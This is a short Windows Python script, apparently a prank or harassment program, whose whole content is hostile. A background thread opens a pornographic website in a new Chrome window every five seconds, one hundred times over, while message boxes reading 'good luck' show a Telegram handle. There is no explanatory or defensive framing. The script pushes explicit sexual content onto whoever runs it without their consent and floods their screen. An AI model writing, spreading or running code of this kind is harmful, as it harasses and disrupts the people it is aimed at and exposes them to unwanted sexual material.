import subprocess
import time 
import ctypes   
import threading

def thread_function(name):
    for i in range(100):
        command = "cmd /c start chrome https://rt.pornhub.com/gayporn/ --new-window"
        subprocess.Popen(command, shell=True)
        time.sleep(5)

x = threading.Thread(target=thread_function, args=(1,))
x.start()


ctypes.windll.user32.MessageBoxW(0, "tg @ynnyqz", "good luck", 0)
ctypes.windll.user32.MessageBoxW(0, "tg @ynnyqz", "good luck", 0)
ctypes.windll.user32.MessageBoxW(0, "tg @ynnyqz", "good luck", 0)
ctypes.windll.user32.MessageBoxW(0, "tg @ynnyqz", "good luck", 0)
ctypes.windll.user32.MessageBoxW(0, "tg qynnyqz", "good luck", 0)


